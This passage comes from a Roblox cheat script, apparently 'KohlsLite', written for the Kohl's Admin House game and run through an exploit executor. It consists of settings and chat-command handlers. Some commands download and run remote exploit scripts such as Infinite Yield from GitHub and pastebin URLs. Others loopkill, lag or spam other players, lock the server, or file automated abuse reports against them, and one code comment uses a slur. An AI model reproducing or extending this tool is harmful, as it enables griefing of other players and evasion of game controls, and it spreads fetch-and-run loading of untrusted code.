                ["Part27"] = {-72.6300049, 2.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part42"] = {-89.0780029, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part26"] = {-72.6300049, 6.10000038, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part30"] = {-83.0780029, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part39"] = {-86.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part25"] = {-72.6300049, 3.70000029, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part24"] = {-72.6300049, 7.30000019, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part34"] = {-80.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part21"] = {-68.0300064, 8.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part22"] = {-72.6300049, 1.30000007, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part58"] = {-98.076004, 0.90200007, 10.4760008, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part17"] = {-68.0300064, 6.10000038, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part19"] = {-68.0300064, 2.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part20"] = {-68.0300064, 4.9000001, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part23"] = {-72.6300049, 8.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part15"] = {-68.0300064, 7.30000019, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part13"] = {-67.5, 8.5, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part12"] = {-67.5, 7.30000019, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part48"] = {-92.0770035, 1.20200002, 10.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part8"] = {-67.5, 4.9000001, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part59"] = {-98.076004, 1.20200002, 13.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part10"] = {-67.5, 1.30000007, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part7"] = {-69, 8.5, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part28"] = {-72.6300049, 4.9000001, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part6"] = {-69, 7.30000019, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part9"] = {-67.5, 6.10000038, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part5"] = {-69, 6.0999999, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part16"] = {-68.0300064, 1.30000007, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part18"] = {-68.0300064, 3.70000029, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part11"] = {-67.5, 3.70000029, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part4"] = {-69, 4.9000001, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part3"] = {-69, 3.70000005, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part2"] = {-69, 2.5, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part1"] = {-69, 1.30000007, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part37"] = {-76.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part14"] = {-67.5, 2.5, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part45"] = {-82.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part38"] = {-80.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part29"] = {-80.076004, 0.900000036, 7.47400045, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Part61"] = {-98.0770035, 0.90200007, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part51"] = {-92.0770035, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1}
}

-- Auto blacklisting for stuff
local autoblvgc = true -- retards kept gearing everyone so here's a quick fix

-- Skip anti crash warning
local skipwarncrash = true

-- Anti logs
local antimlog = false -- for music
local antiglog = false -- for gears
local anticlog = false -- for chars

-- Admin stuff relating to users
local padbanned = {} 
local padreinforcements = false 

-- Variables for moving [old]
local Game_Folder = game:GetService("Workspace").Terrain["_Game"]
local Workspace_Folder = Game_Folder.Workspace
local Admin_Folder = Game_Folder.Admin

-- Keybinds
local housekeybind = "h" -- house keybind
local rekeybind = "r" -- reset keybind
local flykeybind = "f" -- fly keybind
-- local crashkey = "e"  -- crash keybind (unused)

-- Auto things when people join
local autogpcheck = true -- automatically check for player's gamepasses
local autogb = false -- auto gear ban

-- Clicking
local clickexplode = false -- yeah

-- Admin things relating to users
local FAdmins = {} -- all admin but for individual users
local alladmin = false -- all admin

-- Super commands and spamming
local amon = 100 -- super command times
local spamwait = 0 -- spam command wait

-- Music telling
local musicsay = true

-- Admin related
local perm = false
local perm2 = false
local loopgrab = false
local loopgrab2 = false

-- Antis
local anticrash = false
local antigear = false
local antigb = true
local antipaint = false
local antiattach2 = false

local emranticrash = true

-- Antis (workspace)
local antiflash = false
local antidisco = false
local antifogend = false
local antichat = false
local antiattach = false
local noblt = false

-- Gojo server lock
local gjdelock = false

-- Pings relating to others users
local PingLogs = false -- it's caps lol
local PingCsystem = true
local AntiLogs = false

-- Noob detector and welcome/leave message
local noobdetect = true
local welcomemsg = true

-- anti announcer (antigear/anticrash/antipaint/antigb/antiattach2/antiraygun...)
local crash_an = false

-- slock/bl/wl/gearwl/padban etc...
local blwl_an = true -- To be added. please wait

-- shh
thesecretvariable = true

-- loga
local umwhatdasigma = game:HttpGet("https://pastebin.com/raw/d7eTDKbJ") -- oofkohls
local logmode = "default"

-- local permpassid = 66254 or 64354 -> NBC, BC
-- local personpassid = 35748 or 37127 --> NBC, BC

-- Mover 
Mover = {}

Mover.Attached = {Value = false}
Mover.Finished = {Value = false}

Mover.Moving = false
Mover.PosSet = false

print("- Information -")
print("Thank you for using KohlsLite. The version you are using is v"..getgenv().klversion..". This script was created by S_P.")
Remind("Thank you for using KohlsLite. The version you are using is v"..getgenv().klversion..". This script was created by S_P.")
print("Say .kcmds to list some of the commands. DM me at ts2021 for help.")
Remind("Say .kcmds to list some of the commands. DM me at ts2021 for help.")

-- Chat("h \n\n\n KohlsLite executed! Version: "..getgenv().klversion.." \n\n\n")

print("\n\n\n")
print("- Perm check -")
if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 66254) or game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 64354) then
        perm = false 
        hasperm = true -- used
        print("A perm pad was not given - you have the Perm Admin gamepass!")
else
        perm = true
        hasperm = false -- used
        print("A perm pad was given - you don't have the Perm Admin gamepass!")
end

print("\n\n\n")
print("- Persons check -")
if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 35748) or game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 37127) then
        haspersons = true -- used!
        print("You have Person299's Admin! You have access to more features!")
else
        haspersons = false -- used!
        print("You do not have Person299's Admin!")
end

game.Players.LocalPlayer.Chatted:Connect(function(msg)
        task.wait(0)
		
        if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'kcmds' then
           CMDPrint()
           Remind("Check your console by running /console!")
        end

        if string.sub(msg:lower(), 1, #prefix + 2) == prefix..'iy' then -- the classic
                   GExecute("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
		   Remind("Executed Infinite Yield (IY).")
        end

	-- cmd v3
	if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'myvis' then
                if haspersons == true then
                        Remind("The prefix is -")
                        GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/Main%20Scripts/MyVisualiser.lua")
                else 
                        Remind("Sorry, you need persons for this command!")
                end
        end 

        if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'mydraw' then
                if haspersons == true then
                        Remind("The prefix is -")
                        GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/Main%20Scripts/MyVisualiser.lua")
                else 
                        Remind("Sorry, you need persons for this command!")
                end
        end
		
        if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'cmdpi' then -- well, you need that visualiser, do you?
                GExecute("https://raw.githubusercontent.com/S-PScripts/KAH/main/CMD%20v3.lua")
		Remind("Executed CMD PI/V3. Created by quiving. CMD PI/V3 doesn't work for mobile executors by the way.")
        end

        if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'prsc' then -- PR Script ~ atprog
                GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/People's%20Scripts/PR_Script.txt")
		Remind("Executed PR Script. Created by atprog.")
        end

        if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cmdy' then -- you don't need this for attaching anymore ;)
                GExecute("https://raw.githubusercontent.com/S-PScripts/KAH/main/CMD-Y%20(v1.56).lua")
		Remind("Executed CMD Y/V2. Created by quiving.")
        end

        if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'tricky' then -- CREDITS TO TECH
                Remind("This might not work if it's already been executed. Sorry! Created by Tech")
                if haspersons == true then
                        GExecute("https://raw.githubusercontent.com/Tech-187/Music-lyrics-on-time/main/Tricky%20lyrics.lua")
                else
                        GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/Other%20Scripts/Tricky%20Lyrics%20non%20persons.lua")
                end
        end

        if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'ilove' then -- CREDITS TO TECH
                Remind("This might not work if it's already been executed. Sorry! Created by Tech")
                if haspersons == true then
                        GExecute("https://raw.githubusercontent.com/Tech-187/Music-lyrics-on-time/main/I%20loveee.lua")
                else
                        GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/Other%20Scripts/I%20loveee%20non%20persons.lua")
                end
        end

        if string.sub(msg, 1, #prefix + 2)  == prefix..'wl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 4)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
		if player == game.Players.LocalPlayer.Name then 
			return Remind("You cannot whitelist yourself.")
		end
		
		if not table.find(whitelist, player) then		
			if blwl_an then
				if watermark_kl then
                        		Chat("h \n\n\n [KohlsLite]: "..player.." has been whitelisted! \n\n\n")
				else
                        		Chat("h \n\n\n "..player.." has been whitelisted! \n\n\n")
				end
			end	
			if table.find(blacklist, player) then
				Remind("Unblacklisted "..player.." to whitelist them.")
				table.remove(blacklist, table.find(blacklist, player))
			else
                        	Remind("Whitelisted "..player)
			end	
                        table.insert(whitelist, player)
                        Chat('unblind '..player)
                        Chat('unpunish '..player)
                else
                        Remind(player.." is already whitelisted!")
                end
	
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 9)  == prefix..'whitelist' then
		local dasplayer = string.sub(msg:lower(), #prefix + 11)
		Chat(prefix.."wl "..dasplayer)
		-- Remind("ERROR: Use 'wl' instead of 'whitelist'!") -- woz gonna be lazy
       end

       if string.sub(msg, 1, #prefix + 4) == prefix..'unwl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 6)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(whitelist, player) then	
			if blwl_an then
				if watermark_kl then
					Chat("h \n\n\n [KohlsLite]: "..player.." has been unwhitelisted. \n\n\n")
				else
                        		Chat("h \n\n\n "..player.." has been unwhitelisted. \n\n\n")
				end
			end
                        Remind("Unwhitelisted "..player)
                        table.remove(whitelist, table.find(whitelist, player))
                else
                        Remind(player.." was never whitelisted!")        
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

	if string.sub(msg, 1, #prefix + 11)  == prefix..'unwhitelist' then
		local dasplayer = string.sub(msg:lower(), #prefix + 13)
		Chat(prefix.."unwl "..dasplayer)
	end

	if string.sub(msg, 1, #prefix + 2) == prefix..'bl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 4)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
		if player == game.Players.LocalPlayer.Name then 
			return Remind("You cannot blacklist yourself.")
		end
				
                if not table.find(blacklist, player) then
			if blwl_an then
				if watermark_kl then
					Chat("h \n\n\n [KohlsLite]: "..player.." has been blacklisted. \n\n\n");Regen()
				else
                        		Chat("h \n\n\n "..player.." has been blacklisted. \n\n\n");Regen()
				end
			end
			if table.find(whitelist, player) then
				Remind("Unwhitelisted "..player.." to blacklist them.")
				table.remove(whitelist, table.find(whitelist, player))
			else
                        	Remind("Blacklisted "..player)
			end
                        table.insert(blacklist, player)
                else
                        Remind(player.." is already blacklisted!")        
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

	if string.sub(msg, 1, #prefix + 9)  == prefix..'blacklist' then
		local dasplayer = string.sub(msg:lower(), #prefix + 11)
		Chat(prefix.."bl "..dasplayer)
	end
		
        if string.sub(msg, 1, #prefix + 4) == prefix..'unbl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 6)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(blacklist, player) then
			if blwl_an then
				if watermark_kl then
					Chat("h \n\n\n [KohlsLite]: "..player.." has been unblacklisted! \n\n\n")
				else
                        		Chat("h \n\n\n "..player.." has been unblacklisted! \n\n\n")
				end
			end
                        table.remove(blacklist, table.find(blacklist, player))
			if table.find(newplrslocked, player) then
				 table.remove(newplrslocked, table.find(newplrslocked, player))
			end
                        Remind("Unblacklisted "..player)
                        Chat('unblind '..player)
                        Chat('unpunish '..player)
                else
                        Remind(player.." was never blacklisted!")        
                end

         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
        end

        if string.sub(msg, 1, #prefix + 11)  == prefix..'unblacklist' then
		local dasplayer = string.sub(msg:lower(), #prefix + 13)
		Chat(prefix.."unbl "..dasplayer)
        end
		
        if string.sub(msg, 1, #prefix + 6)  == prefix..'listwl' then
           Remind("Check your console by running /console!")
           for i = 1, #whitelist do
                  print(whitelist[i])
           end
        end

        if string.sub(msg, 1, #prefix + 8)  == prefix..'antimlog' then
                antimlog = true
		Remind("Players won't be finding out the music ids in this script now!")
        end

        if string.sub(msg, 1, #prefix + 10)  == prefix..'unantimlog' then
                antimlog = false
		Remind("Players can find out the music ids in this script now!")
        end

        if string.sub(msg, 1, #prefix + 5)  == prefix..'admin' then
         local dasplayer = string.sub(msg:lower(), #prefix + 7)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if not table.find(FAdmins, player) then
			if blwl_an then
                        	Chat("h \n\n\n "..player.." has been given admin! \n\n\n")
			end
                        Remind("Admined "..player)
                        table.insert(FAdmins, player)
                else
                        Remind(player.." is already an admin!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

        if string.sub(msg, 1, #prefix + 7)  == prefix..'unadmin' then
         local dasplayer = string.sub(msg:lower(), #prefix + 9)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(FAdmins, player) then
			if blwl_an then
                        	Chat("h \n\n\n "..player.." has been removed from admin. \n\n\n")
			end
                        Remind("Unadmined "..player)
                        table.remove(FAdmins, table.find(FAdmins, player))
                else
                        Remind(player.." was never an admin!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 9)  == prefix..'listadmins' then
          Remind("Check your console by running /console!")
          for i = 1, #FAdmins do
                  print(FAdmins[i])
          end
        end

        if string.sub(msg, 1, #prefix + 6)  == prefix..'gearwl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 8)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
		if player == game.Players.LocalPlayer.Name then 
			return Remind("You cannot gear whitelist yourself.")
		end
				
                if not table.find(GWhitelisted, player) then
			if blwl_an then
                        	Chat("h \n\n\n "..player.." has been whitelisted from anti-gears! \n\n\n")
			end
                        Remind("Gear whitelisted "..player)
                        table.insert(GWhitelisted, player)
                else
                        Remind(player.." is already gear whitelisted!")        
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

        if string.sub(msg, 1, #prefix + 8)  == prefix..'ungearwl' then
         local dasplayer = string.sub(msg:lower(), #prefix + 10)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(GWhitelisted, player) then
			if blwl_an then
                        	Chat("h \n\n\n "..player.." has been unwhitelisted from anti-gears. \n\n\n")
			end
                        Remind("Un gear whitelisted "..player)
                        table.remove(GWhitelisted, table.find(GWhitelisted, player))
                else
                        Remind(player.." was never gear whitelisted!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

        if string.sub(msg, 1, #prefix + 10)  == prefix..'listgearwl' then
           Remind("Check your console by running /console!")
           for i = 1, #GWhitelisted do
                  print(GWhitelisted[i])
           end
        end

        if string.sub(msg, 1, #prefix + 6)  == prefix..'fogvis' then -- fonalc funny var
                fogdance = true
		Remind("Fog visualiser is now on!")
        end

        if string.sub(msg, 1, #prefix + 8)  == prefix..'unfogvis' then -- fonalc funny var
                fogdance = false
                task.wait(0.5)
                Chat("fix")
		Remind("Fog visualiser is now off!")
        end

        if string.sub(msg, 1, #prefix + 4)  == prefix..'ccol' then
                Chat("fogend 0")
                ccolours = true
		Remind("CrAzY cOlOuRs!")
        end

        if string.sub(msg, 1, #prefix + 6)  == prefix..'unccol' then
                ccolours = false
                task.wait(0.5)
                Chat("fix")
		Remind("No more crazy colours, phew!")
        end
		
        if string.sub(msg, 1, #prefix + 6)  == prefix..'blwlan' then
			blwl_an = true
			Remind("Blacklist/whitelist/gearwhitelist etc announcements enabled.")
	end

        if string.sub(msg, 1, #prefix + 6)  == prefix..'unblwlan' then
			blwl_an = true
			Remind("Blacklist/whitelist/gearwhitelist etc announcements enabled.")
	end

       if string.sub(msg, 1, #prefix + 8) == prefix..'loopkill' then
         local dasplayer = string.sub(msg:lower(), #prefix + 10)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if not table.find(loopkill, player) then
			if blwl_an then
                        	Chat("h \n\n\n "..player.." is being loopkilled. \n\n\n")
			end
                        Remind("Loopkilling "..player)
                        table.insert(loopkill, player)
                else
                        Remind(player.." is already being loopkilled!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 10) == prefix..'unloopkill' then
         local dasplayer = string.sub(msg:lower(), #prefix + 12)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(loopkill, player) then
			if blwl_an then
                        	Chat("h \n\n\n "..player.." is no longer being loopkilled! \n\n\n")
			end
                        Remind("Stopped loopkilling "..player)
                        table.remove(loopkill, table.find(loopkill, player))
                else
                        Remind(player.." was never loopkilled!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

   if string.sub(msg, 1, #prefix + 5) == prefix..'names' then
         local dasplayer = string.sub(msg:lower(), #prefix + 7)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if not table.find(byecam, player) then
			if blwl_an then
                        	Chat("h \n\n\n "..player.."'s camera is getting spam named! \n\n\n")
			end
                        Remind("Spam naming "..player)
                        table.insert(byecam, player)
                else
                        Remind(player.." is already being spam named!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 7) == prefix..'unnames' then
         local dasplayer = string.sub(msg:lower(), #prefix + 9)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(byecam, player) then
			if blwl_an then
                        	Chat("h \n\n\n "..player.."'s camera is no longer being spam named! \n\n\n")
			end
                        Remind("Stopped spam naming "..player)
                        table.remove(byecam, table.find(byecam, player))
                else
                        Remind(player.." was never spam named!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

   if string.sub(msg, 1, #prefix + 6) == prefix..'lagged' then
         local dasplayer = string.sub(msg:lower(), #prefix + 8)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if not table.find(carcar, player) then
			if blwl_an then
                        	Chat("h \n\n\n "..player.." loves cars! Yummy! \n\n\n")
			end
                        Remind("Spam car-ing "..player)
                        table.insert(carcar, player)
                else
                        Remind(player.." is already being spam carred!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 8) == prefix..'unlagged' then
         local dasplayer = string.sub(msg:lower(), #prefix + 10)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                if table.find(carcar, player) then
			if blwl_an then
                        	Chat("h \n\n\n "..player.."'s hates cars! Noooooo \n\n\n")
			end
                        Remind("Stopped spam car-ing "..player)
                        table.remove(carcar, table.find(carcar, player))
                else
                        Remind(player.." was never spam carred!")
                end
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 6) == prefix..'report' then
         local dasplayer = string.sub(msg:lower(), #prefix + 8)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                        Remind("Reported "..player.."! Note that reporting doesn't work on some executors")
                        game.Players:ReportAbuse(game:GetService("Players"),player,"Cheating/Exploiting", "Spamming random stuff " .. math.random(1, 3276700))         
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

      if string.sub(msg, 1, #prefix + 9) == prefix..'checkperm' then
         local dasplayer = string.sub(msg:lower(), #prefix + 11)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                gcplr = cplr
                gcplrn = player
                checkforperm()
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

       if string.sub(msg, 1, #prefix + 10) == prefix..'fcheckperm' then -- cool amirite
	  Remind("Wait 5 seconds then check logs...")
          Chat("reset all")
          Regen()
          task.wait(1)
          checkperm2 = true
          Chat("ff admins")
          task.wait(2)
          checkperm2 = false
          Chat("unff admins")
       end

       if string.sub(msg, 1, #prefix + 12) == prefix..'checkpersons' then
         local dasplayer = string.sub(msg:lower(), #prefix + 14)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                gcplr = cplr
                gcplrn = player
                checkforpersons()
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
        end

      if string.sub(msg, 1, #prefix + 8) == prefix..'checkgps' then
         local dasplayer = string.sub(msg:lower(), #prefix + 10)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                gcplr = cplr
                gcplrn = player
                checkforperm()
                checkforpersons()
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
       end

        if string.sub(msg, 1, #prefix + 6)  == prefix..'listbl' then
           Remind("Check your console by running /console!")
           for i = 1, #blacklist do
                  print(blacklist[i])
           end
        end

        if string.sub(msg, 1, #prefix + 9)  == prefix..'permusers' then
           Remind("Check your console by running /console!")
           for i = 1, #permusers do
                  print(permusers[i])
           end
        end

        if string.sub(msg, 1, #prefix + 12)  == prefix..'personsusers' then
           Remind("Check your console by running /console!")
           for i = 1, #personsusers do
                  print(personsusers[i])
           end
        end

       if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'adminjoy' then
                game.Players.LocalPlayer:Kick("you: 'i use adminjoy trash!' Anyways, ask ME to add the colourful seizure crap, don't use THAT!")
       end

       if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'slock' then
	if blwl_an then
        	Chat("h \n\n\n Server is locked! \n\n\n");Regen()
	end
        slockenabled = true
	Remind("Turned on the serverlock!")
       end

       if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unslock' then
        slockenabled = false
	if blwl_an then
        	Chat("h \n\n\n Server is unlocked! \n\n\n")
	end
        Chat('unblind all')
        Chat('unpunish all')
	Remind("Turned off the serverlock!")
       end

       if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'newplrslock' then
          newplrautoslock = true
	  Remind("New player auto slock is now enabled!")
       end

       if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'unnewplrslock' then
          newplrautoslock = false
	  Remind("New player auto slock is now disabled!")
       end

       if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'autoblvgc' then
                Remind("Auto blacklisting users using the VG!")
                autoblvgc = true
       end

       if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unautoblvgc' then
                Remind("No longer auto blacklisting users using the VG!")
                  autoblvgc = false
       end

        if string.sub(msg, 1, #prefix + 7)  == prefix..'npslist' then
           Remind("Check your console by running /console!")
           for i = 1, #newplrslocked do
                  print(newplrslocked[i])
           end
        end

      if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'plrnewlen' then
                newlen = tonumber(string.sub(msg:lower(), #prefix + 11))
                Remind("Set age restrictions to "..newlen.." days!")
      end

      if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'pboombox' then
            Chat("gear me 212641536")
            task.wait(0.5)
            local check = string.sub(msg:lower(), #prefix + 10, #prefix + 10)
	    if check == "g" then
			local idrinkrum = string.sub(msg, #prefix + 11) ; task.wait(0)
			myplay = musictable[idrinkrum].id
	    else
			myplay = string.sub(msg:lower(), 10 + #prefix)
	    end
            repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("SuperFlyGoldBoombox")
            local bom = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
            bom.Parent = game.Players.LocalPlayer.Character                                   
            task.wait(0.25)
	    bom.Remote:FireServer("PlaySong", tonumber(myplay))
      end

      if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'mboombox' then
            Chat("gear me 212641536")
            task.wait(0.5)
            local check = string.sub(msg:lower(), #prefix + 10, #prefix + 10)
	    if check == "g" then
			local idrinkrum = string.sub(msg, #prefix + 11) ; task.wait(0)
			myplay = musictable[idrinkrum].id
	    else
			myplay = string.sub(msg:lower(), 10 + #prefix)
	    end
            repeat task.wait() until game.Players.LocalPlayer.Backpack:WaitForChild("SuperFlyGoldBoombox")
            local bom = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
            bom.Parent = game.Players.LocalPlayer.Character                                   
            task.wait(0.25)
	    bom.Remote:FireServer("PlaySong", tonumber(myplay))
	    function rng() 
                	return math.random(-bgrange, bgrange)
            end
            bom.GripPos = Vector3.new(rng(), 1, rng())
      end

      if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'bgrange' then
		bgrange = tonumber(string.sub(msg:lower(), #prefix + 9))
      end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'lgmusic' then
        ieatkids = string.sub(msg, #prefix + 8)
        if workspace.Terrain["_Game"].Folder:FindFirstChild("localsound") then
                        lsound:Stop()
                        lsound:Destroy()
        end
        lsound = Instance.new("Sound", workspace.Terrain["_Game"].Folder)
        lsound.Name = "localsound"
        lsound.SoundId = "rbxassetid://"..musictable[ieatkids].id
        lsound:Play()
	Remind("Local gmusic playing.")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unlgmusic' then
              if workspace.Terrain["_Game"].Folder:FindFirstChild("localsound") then
                        lsound:Stop()
                        lsound:Destroy()
			Remind("Local gmusic ended.")
              end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'msay' then
        musicsay = true
	Remind("Gmusic will be announced.")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'unmsay' then
        musicsay = false
	Remind("Gmusic will no longer be announced.")
    end                

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'gmusic' then
        musicplay = string.sub(msg, #prefix + 7)
        if musicsay == true then
           Chat("h \n\n\n Playing music: ".. musictable[musicplay].name ..". \n\n\n")
        end
        if antimlog then
            Chat("music 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" .. musictable[musicplay].id)
        else
            Chat("music " .. musictable[musicplay].id)
        end;musicplay = tonumber(musicplay)
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'rgmusic' then
        local length = 0
        for _ in pairs(musictable) do
                    length = length + 1
        end
        local randomindex = math.random(1, length)
        local rizz = tostring(randomindex)
         if musicsay == true then
                    Chat("h \n\n\n Playing music: " .. musictable[rizz].name .. ". \n\n\n")
         end
         if antimlog then
                    Chat("music 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" .. musictable[rizz].id)
         else
                Chat("music " ..musictable[rizz].id)
         end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'nmusic' then -- if it double executes ... you
            if ratelj then print("anti double execution worked!") return end
            ratelj = true

            local length = 0
            for _ in pairs(musictable) do
                length = length + 1
            end

           if musicplay == nil or musicplay == length then
                        musicplay = 1
            else
                        musicplay = musicplay + 1
            end

            local mast = tostring(musicplay)

            if musicsay == true then
                Chat("h \n\n\n Playing music: " .. musictable[mast].name .. ". \n\n\n")
            end

            if antimlog then
                Chat("music 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" .. musictable[mast].id)
           else
                Chat("music " .. musictable[mast].id)
           end; ratelj = false
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'pmusic' then -- if it double executes ... you
            if ratelj then print("anti double execution worked!") return end
            ratelj = true

            local length = 0
            for _ in pairs(musictable) do
                length = length + 1
            end

           if musicplay == nil or musicplay == 1 then
                        musicplay = length
            else
